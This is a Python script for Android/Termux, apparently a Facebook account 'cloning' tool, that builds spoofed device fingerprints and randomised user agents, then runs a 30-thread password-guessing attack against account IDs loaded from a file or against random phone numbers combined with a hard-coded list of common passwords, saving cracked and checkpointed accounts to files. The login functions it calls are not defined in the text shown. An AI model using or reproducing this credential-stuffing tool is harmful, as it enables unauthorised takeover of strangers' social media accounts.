
from os import path
import os,base64,zlib,pip,urllib, random 

#os.system('xdg-open https://www.facebook.com/profile.php?id=100003054696287')
os.system('clear')
print('\n\033[1;32m [√] \033[1;31mInstalling Modules...!')
print('\033[1;35m')

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n \033[1;32m [√] \033[1;31mInstalling Missing Modules...!')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python ZUHAIB.py')
except:pass

blue = '\033[1;35m'
white = '\033[1;37m'
rad = '\033[1;31m'
green = '\033[1;32m'
print('\033[1;37m')
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
logo=(""" \033[;91 
 _______                    _______ _________ ______  
/ ___   )|\     /||\     /|(  ___  )\__   __/(  ___ \ 
\/   )  || )   ( || )   ( || (   ) |   ) (   | (   ) )
    /   )| |   | || (___) || (___) |   | |   | (__/ / 
   /   / | |   | ||  ___  ||  ___  |   | |   |  __ (  
  /   /  | |   | || (   ) || (   ) |   | |   | (  \ \ 
 /   (_/\| (___) || )   ( || )   ( |___) (___| )___) )
(_______/(_______)|/     \||/     \|\_______/|/ \___/
---------------------------------------------------
{\033[;92m+\033[;37m}     Creater     :         Zuhaib Amjad Abbasi
{\033[;92m+\033[;37m}     Github      :         Soon
{\033[;92m+\033[;37m}     Tool        :         Force
---------------------------------------------------""")


def linex():
	print(51*'-')
	
def clear():
        os.system('clear')
        print(logo)
        
###### METHOD THINGS ######        
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]

#####  CONTACT ADMIN ######

def admin():
	clear()
	print('\033[97;1m [\033[1;32m1\033[97;1m] \033[1;37mContact To Whatsapp')
	print('\033[97;1m [\033[1;32m2\033[97;1m] \033[1;37mContact To Facebook')
	print('\033[97;1m [\033[1;32m0\033[97;1m] \033[1;31mBack Main Menu');linex()
	faraz=input(' \033[1;33m[+] \033[1;32mChoose :\033[97;1m ')
	if faraz == '1':
		os.system('xdg-open https://wa.me/+923187061605');menu()
	if faraz == '2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100003054696287');menu()
	if faraz == '0':
		menu()
	else:
		linex();print('\033[1;33m [+]\033[1;31m Selected Wrong Option ');time.sleep(2);menu()

######## JOIN GROUP ###### 

def group():
	clear()
	print('\033[97;1m [\033[1;32m1\033[97;1m] \033[1;37mJoin WhatsApp Group')
	print('\033[97;1m [\033[1;32m2\033[97;1m] \033[1;37mJoin Facebook Group')
	print('\033[97;1m [\033[1;32m0\033[97;1m] \033[1;31mBack Main Menu');linex()
	ZUHAIB=input(' \033[1;33m[+] \033[1;32mChoose :\033[97;1m ')
	if ZUHAIB == '1':
		os.system('xdg-open https://chat.whatsapp.com/HzqmfqS2HjyDz9MRDMSeD7');menu()
	if ZUHAIB == '2':
		os.system('xdg-open https://facebook.com/groups/1245912839659325/');menu()
	if ZUHAIB == '0':
		menu()
	else:
		linex();print('\033[1;33m [+]\033[1;31m Selected Wrong Option ');time.sleep(2);menu()
####### MAIN #####

def menu():
                        clear();linex();print('\033[97;1m [\033[1;32m1\033[97;1m] File Cloning');print(' [\033[1;32m2\033[97;1m] Random Cloning ');print('\033[97;1m [\033[1;32m3\033[97;1m] \033[1;33mJoin Group ');print('\033[97;1m [\033[1;32m4\033[97;1m] \033[1;33mContact Admin ');print('\033[97;1m [\033[1;32m0\033[97;1m] \033[1;31mExit Programming')
                        linex()
                        ZUHAIB=input(' \033[1;33m[+] \033[1;32mChoose :\033[97;1m ')
                        if ZUHAIB in ['1','01']:file()                           
                        elif ZUHAIB in ['2','02']:pak()
                        elif ZUHAIB in ['3','03']: group()                              
                        elif ZUHAIB in ['4','04']:admin()                        	                        
                        elif ZUHAIB in ['0','00']:os.system('xdg-open https://www.facebook.com/profile.php?id=100003054696287');linex();print('\033[1;32m[+] \033[97;1mThanks For Use\n\033[1;32m[+] \033[97;1mSee You Again ');exit()                
                        else:
                                linex();print('\033[1;33m [+]\033[1;31m Selected Wrong Option ');time.sleep(2);menu()
            
###### FILE #####           
def file():
	
		clear();print("\033[1;32m [+]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/ZUHAIB.txt");linex()
		file = input(f'\033[1;32m [?]\033[1;37m PUT FILE PATH : ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			clear();print(f'\n\033[1;32m [!]\033[1;31m File location not found ');time.sleep(3)
			menu()
		clear();print(f'\033[1;32m [1] \033[1;37mMETHOD\033[1;32m > \033[1;37m1\n\033[1;32m [2] \033[1;37mMETHOD\033[1;32m > \033[1;37m2\n\033[1;32m [3] \033[1;37mMETHOD\033[1;32m > \033[1;37m3');linex()
		mthd=input(f'\033[1;32m [?] \033[1;37mCHOOSE : ')
		plist=[]
		try:
			clear()
			ps_limit = int(input(f'\033[1;32m [?]\033[1;37m ENTER PASS LIMIT : '));clear()
		except:
			ps_limit =1
		print(f'\033[1;32m [+] \033[1;32mEXAMPLE :\033[1;37m first last,firtslast,first123');linex()
		for i in range(ps_limit):
			plist.append(input(f'\033[1;32m [?]\033[1;37m PUT PASSWORD\033[1;32m {i+1} : \033[1;37m'))
		clear()
		cx=input(f'\033[1;32m [?] \033[1;37mSHOW CP ACCOUNT \033[1;32m(y/n) :\033[1;37m ')
		
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f'\033[1;32m (√) Total IDs : \033[1;32m'+total_ids+f'\n\033[1;32m [√] \033[1;37mMethod \033[1;32m>\033[1;37m \033[1;37mM{mthd}')
			print(f"\x1b[38;5;208m (!) Use Flight Mode For Speed UP")
			linex()
			for user in fo:
				ids,names = user.split(f'|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(api1,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(api1,ids,names,passlist)
				else:
					crack_submit.submit(api1,ids,names,passlist)
		linex();print("\n\033[1;32m [✓] \033[1;33mYOUR PROCESS HAS BEEN COMPLETED");linex();input("\033[1;32m [✓] \033[1;31mPRESS ENTER TO BACK ");os.system('python ZUHAIB.py')

####### RANDOM #####
    
def pak():
                user=[]
                clear()
                print('\033[1;32m [+] \033[1;33mCODE : \033[1;37m0300,017,880141...etc');linex()
                code = input('\033[1;32m [?]\033[1;33m INPUT CODE :\033[1;37m ')
                try:                	
                        clear();print('\033[1;32m [+] \033[1;33m Example : \033[1;37m2000,5000,10000...');linex();limit = int(input('\033[1;32m [?] \033[1;33mENTER LIMIT :\033[1;37m '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                #clear();cp=input('\033[1;32m [?] \033[1;33m Show Cp Account \033[1;32m(y/n) : \033[1;37m');linex();c=input('\033[1;32m [?] \033[1;33m Show Cookie \033[1;32m(y/n) : \033[1;37m')             
                with tred(max_workers=30) as ZUHAIB:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;32m (√) Total IDs  :\033[1;32m '+tl);print('\033[1;35m (√) Chose Code : \033[1;32m%s'%(code));print("\x1b[38;5;208m (!) Use Flight Mode For Speed UP");linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan123','khan123','khan12345','pakistan','baloch123','baloch786','khan123456','i love you','bengladesh','khanbaba','khankhan','baloch','freefire','malik786','malik1122','malik123','malik12345','malik123456','khanking']
                                ZUHAIB.submit(rndm,ids,passlist)
                print("\n");linex();print(' \033[1;32m[+] \033[1;37mCloning Complete');linex();print(' \033[1;32m[+] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/ZUHAIB-OK.txt\n \033[1;32m[+] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/ZUHAIB-CP.txt');linex();input(' \033[1;32m[+]\033[1;33m Press Enter To Back Menu ');os.system('python ZUHAIB.py')
   
userggents="""
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v3703914388514982487 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1522624600950985189 t4763100215355965436 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082451959 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082454602 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082457257 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v7878664985507590752 t6402838359464213558 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v3362914098297791158 t1737404651745038500 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872290439 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082465947 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4176339355301370756 t6402838359464213558 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5428479102736810377 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v7863938640015126194 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082475857 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082478499 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v7432867588807617964 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082481149 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872370131 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v80611155147806793 t4147937780250091430 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v5719892281019410869 t6887521660640726643 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v2981337680027881500 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4056229610255737633 t2855447945163266834 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082489188 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8539436187412284615 t832576955195415109 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5077499483376554604 t5691531456657477892 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082499092 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8733830533197110641 t5648263770542704054 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3544777580198539289 t5755185651384491427 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3483695382839825258 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082501740 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v7551137255678146520 t4803866639546985847 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082504394 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3245751044627177274 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4746289679026838098 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082513097 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4212140487091043556 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v7779851236794268305 t7427258062421531350 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5150601460969254728 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4427398945133467286 t4763100215355965436 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082523009 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872507611 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8512285332675113351 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082525652 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v7249328530779325003 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082528306 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v866780812232829323 t1403586453951734988 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082537005 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872562706 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v2222699493826410550 t6887521660640726643 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8272001410929565910 t1029548762767996041 ath4b3726d5 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082546915 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7610367012364143868 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082549557 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082552212 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v9090953937483142692 t2855447945163266834 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v4485854093948732177 t5523802693953152063 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7193805918866027805 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1050556486877270663 t5648263770542704054 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082560900 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v1379107586794050418 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v6794109624077523058 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872645116 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082570816 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082573458 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082576112 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4255684927586864332 t6402838359464213558 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872700175 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v9040300839133573615 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v4277972707488716818 t1737404651745038500 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082584804 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v6609560507321070498 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v5117391839018038324 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082594714 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082597358 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v6481323239287150112 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082600009 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872779872 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
